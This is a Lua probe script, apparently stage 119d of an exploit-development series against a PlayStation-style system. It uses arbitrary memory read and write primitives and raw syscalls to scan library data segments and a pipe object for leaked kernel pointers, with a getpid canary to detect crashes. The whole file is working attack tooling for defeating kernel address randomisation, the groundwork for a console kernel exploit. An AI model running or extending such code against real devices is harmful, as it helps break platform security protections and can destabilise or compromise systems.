-- CRASH_CLASS: LOW
-- PROBE 119d: Verify kernel pointers in libSceLibcInternal data
--
-- 119c found 10+ values matching kernel VA pattern at data+0x0A428.
-- This probe:
--   A: Read as dword pairs to verify byte layout
--   B: Dump the full table (beyond the 10-entry cap)
--   C: Read libSceLibcInternal data at OTHER offsets for more kptrs
--   D: Check 0xA428 is a GOT/PLT/relocation table
--   E: Try pipe object again (119c cut off)

print("=== PROBE 119d: KPTR VERIFICATION ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val)=="table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val==nil then return "nil" end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    if l<0 then l=l+0x100000000 end
    return string.format("0x%X%08X",h,l)
end
local function fmtd(v)
    if v==nil then return "nil" end
    if v<0 then v=v+0x100000000 end
    return string.format("0x%08X",v)
end
local function is_kptr(val)
    if val==nil then return false end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    return h>=0xFFFF8000 and h<0xFFFFF000 and h~=0xFFFFFFFF
end
local function read_base(inf_addr, off)
    local lo=rd(inf_addr+off) or 0; local hi=rd(inf_addr+off+4) or 0
    if hi<0 then hi=hi+0x100000000 end
    if lo<0 then lo=lo+0x100000000 end
    if hi==0 and lo==0 then return nil end
    return N(uint64(string.format("0x%X%08X", hi, lo)))
end

local stub=syscall.pipe.fn_addr
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local sc_info=mk(593)

-- Get libSceLibcInternal data base
local inf=memory.alloc(0x200)
wd(inf,0x160)
pcall(function() sc_info(uint64(2),inf) end)
local I=N(inf)
local DB=read_base(I,0x118)
local TB=read_base(I,0x108)
if not DB then print("NO DATA BASE!") return end
print(string.format("libcint text=0x%X data=0x%X", TB or 0, DB))

-- ============================================================
print("")
print("--- A: DWORD PAIRS AT +0x0A420-0x0A480 ---")
-- Read as individual dwords to see exact byte layout
for off=0x0A420,0x0A480,4 do
    local v=rd(DB+off)
    print(string.format("  data+0x%05X: %s", off, fmtd(v)))
end

-- ============================================================
print("")
print("--- B: FULL KPTR TABLE (no cap) ---")
-- Scan from +0x0A400 through +0x0A600
local kp=0
local first_kp_off = nil
local last_kp_off = nil
for off=0x0A400,0x0A5F8,8 do
    local val=rq(DB+off)
    if val and is_kptr(val) then
        kp=kp+1
        if not first_kp_off then first_kp_off=off end
        last_kp_off=off
        print(string.format("  +0x%05X: %s", off, fmt(val)))
    end
end
print(string.format("  range 0xA400-0xA600: %d kptrs, first=0x%X last=0x%X",
    kp, first_kp_off or 0, last_kp_off or 0))

local c=N(native.fcall_with_rax(stub,20))
if c~=pid then print("DIED!") return end

-- ============================================================
print("")
print("--- C: SCAN REST OF DATA SEGMENT ---")
-- Continue past 0xA478 where 119c stopped
local dsz=0x84000
local more_kp=0
for off=0x0A600,dsz-8,8 do
    local val=rq(DB+off)
    if val==nil then
        print(string.format("  unreadable at +0x%X", off))
        break
    end
    if is_kptr(val) then
        more_kp=more_kp+1
        print(string.format("  +0x%05X: %s", off, fmt(val)))
        if more_kp>=20 then
            print("  (capped)")
            break
        end
    end
end
print(string.format("  rest of data: %d more kptrs", more_kp))

c=N(native.fcall_with_rax(stub,20))
if c~=pid then print("DIED!") return end

-- ============================================================
print("")
print("--- D: CHECK CONTEXT AROUND KPTR TABLE ---")
-- What's just before the kptr table? Could be a GOT header or count
for off=0x0A400,0x0A428,8 do
    local val=rq(DB+off)
    print(string.format("  +0x%05X: %s", off, fmt(val)))
end
-- What's after the last kptr?
local after_off = (last_kp_off or 0x0A470) + 8
for off=after_off,after_off+0x40,8 do
    local val=rq(DB+off)
    if val then
        print(string.format("  +0x%05X: %s", off, fmt(val)))
    end
end

-- ============================================================
print("")
print("--- E: PIPE OBJECT SCAN ---")
local pipe_str=tostring(syscall.pipe)
local addr_str=pipe_str:match("address @ (0x[0-9a-fA-F]+)")
print("  pipe_addr="..tostring(addr_str))

if addr_str then
    local PA=tonumber(addr_str)
    if PA then
        -- First check if readable
        local pv=rq(PA)
        if pv then
            print("  *** PIPE READABLE ***")
            local pkp=0
            for off=0,0xF8,8 do
                local val=rq(PA+off)
                local tag=""
                if val and is_kptr(val) then
                    pkp=pkp+1
                    tag=" ***KPTR***"
                end
                print(string.format("    +0x%02X: %s%s", off, fmt(val), tag))
            end
            print(string.format("  pipe kptrs: %d", pkp))
        else
            print("  NOT readable")
        end
    end
end

-- ============================================================
print("")
print("--- F: OTHER MODULES DATA KPTR SCAN ---")
-- Scan handles 3-20 for data segments with kptrs
for handle=3,20 do
    local inf2=memory.alloc(0x200)
    wd(inf2,0x160)
    local ok2=pcall(function() sc_info(uint64(handle),inf2) end)
    if not ok2 then break end
    local I2=N(inf2)
    local tb2=read_base(I2,0x108)
    if not tb2 then break end
    local db2=read_base(I2,0x118)
    if db2 then
        local dsz2_raw=rq(I2+0x120)
        local dsz2=0
        if dsz2_raw then
            local dh,dl=get_hi_lo(dsz2_raw)
            if dl<0 then dl=dl+0x100000000 end
            dsz2=dl
        end
        local name=""
        for i=0,31 do
            local b=rd(I2+8+i)
            if not b then break end
            local ch=b%256
            if ch==0 then break end
            if ch>=32 and ch<127 then name=name..string.char(ch) end
        end
        local mkp=0
        local limit=math.min(dsz2, 0x40000)
        for off=0,limit-8,8 do
            local val=rq(db2+off)
            if val==nil then break end
            if is_kptr(val) then
                mkp=mkp+1
                if mkp<=5 then
                    print(string.format("  [%d]'%s' +0x%X: %s", handle, name, off, fmt(val)))
                end
            end
        end
        if mkp>0 then
            print(string.format("  [%d]'%s': %d kptrs in 0x%X bytes", handle, name, mkp, limit))
        end
    end
end

-- ============================================================
print("")
c=N(native.fcall_with_rax(stub,20))
print(string.format("FINAL: canary=%s", c==pid and "OK" or "FAIL"))
print("=== 119d COMPLETE ===")
